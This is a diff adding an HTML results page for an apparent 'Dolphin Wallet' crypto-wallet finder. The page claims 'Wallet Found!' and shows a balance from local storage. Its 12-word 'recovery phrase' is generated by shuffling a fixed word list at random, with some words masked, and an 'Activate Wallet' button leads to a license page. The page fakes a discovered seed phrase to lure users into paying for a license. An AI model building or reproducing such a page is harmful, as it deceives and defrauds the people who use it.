@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Scan Result - Dolphin Wallet</title>
+  <link rel="stylesheet" href="../assets/style-neon.css" />
+  <style>
+    body {
+      background: radial-gradient(ellipse at center, #000010, #000);
+      font-family: 'Orbitron', sans-serif;
+      color: #0ff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .result-box {
+      border: 1px solid #0ff4;
+      padding: 40px;
+      border-radius: 20px;
+      background: rgba(0, 10, 20, 0.8);
+      box-shadow: 0 0 30px #0ff4, inset 0 0 20px #0ff2;
+      text-align: center;
+      width: 95%;
+      max-width: 720px;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    .wallet-info {
+      font-size: 1.1em;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .mnemonic {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .mnemonic input {
+      background: #000;
+      border: 1px solid #0ff6;
+      padding: 10px;
+      border-radius: 8px;
+      color: #0ff;
+      text-align: center;
+      font-family: monospace;
+      font-size: 0.9em;
+    }
+    .btn {
+      margin-top: 30px;
+      padding: 12px 24px;
+      font-size: 1em;
+      color: #000;
+      background: #0ff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .btn:hover {
+      background: #00faff;
+      box-shadow: 0 0 12px #0ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="result-box">
+    <h1>🎉 Wallet Found!</h1>
+    <div class="wallet-info" id="walletInfo">
+      Loading...
+    </div>
+    <div class="mnemonic" id="mnemonicWords"></div>
+    <button class="btn" onclick="goToLicense()">Activate Wallet</button>
+  </div>
+
+  <script>
+    function goToLicense() {
+      window.location.href = "license.html";
+    }
+
+    const wallet = JSON.parse(localStorage.getItem("found_wallet"));
+    if (wallet) {
+      const address = wallet.address;
+      const maskedAddress = address.substring(0, 6) + "••••••••" + address.slice(-4);
+      document.getElementById("walletInfo").innerHTML = `
+        <strong>Address:</strong><br>${maskedAddress}<br><br>
+        <strong>Balance:</strong> ${wallet.balance}<br>
+        <strong>Network:</strong> ${wallet.network}<br>
+        <strong>Last Transaction:</strong> ${wallet.lastTx}
+      `;
+
+      const allWords = [
+        "trouble", "filter", "gallery", "oxygen", "salmon", "silent",
+        "pistol", "bounce", "diamond", "trigger", "planet", "furnace",
+        "immune", "flee", "people", "initial", "panic", "crucial",
+        "display", "grace", "aim", "copper", "fashion", "pelican",
+        "pulp", "average", "wheel", "pride", "sketch", "flag",
+        "narrow", "object", "juice", "victory", "swallow", "refuse",
+        "goat", "dune", "phrase", "hole", "boy", "maid",
+        "report", "exhibit", "ride", "lecture", "dynamic", "burger",
+        "fork", "disorder", "assume", "table", "dawn", "hood",
+        "office", "art", "share", "later", "sell", "paper",
+        "quick", "steel", "acid", "taste", "promote", "robust",
+        "false", "hockey", "employ", "dinner", "scene", "rain"
+      ];
+      const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
+      const maskedIndices = [2, 4, 5, 6, 8, 10];
+      const wordInputs = selected.map((word, index) => {
+        return `<input type="text" readonly value="${maskedIndices.includes(index) ? '••••••' : word}" />`;
+      }).join("");
+
+      document.getElementById("mnemonicWords").innerHTML = wordInputs;
+    } else {
+      document.getElementById("walletInfo").innerHTML = "❌ No wallet data found.";
+    }
+  </script>
+</body>
+</html>
